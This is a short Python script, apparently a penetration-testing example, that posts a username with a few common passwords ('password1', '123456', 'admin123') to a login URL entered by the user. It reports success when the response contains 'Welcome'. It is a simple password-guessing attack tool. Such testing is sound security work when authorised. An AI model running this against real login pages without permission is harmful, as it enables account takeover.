import requests

def test_broken_auth(url, username, password_list):
    for password in password_list:
        payload = {'username': username, 'password': password}
        try:
            response = requests.post(url, data=payload)
            if "Welcome" in response.text:
                print(f"[+] Authentication bypassed with {username}:{password}")
                return
        except Exception as e:
            print(f"Error: {e}")
    print("[-] No broken authentication detected")

# Test usage
if __name__ == "__main__":
    target_url = input("Enter login URL: ")
    username = input("Enter username: ")
    password_list = ['password1', '123456', 'admin123']  # List of common passwords
    test_broken_auth(target_url, username, password_list)
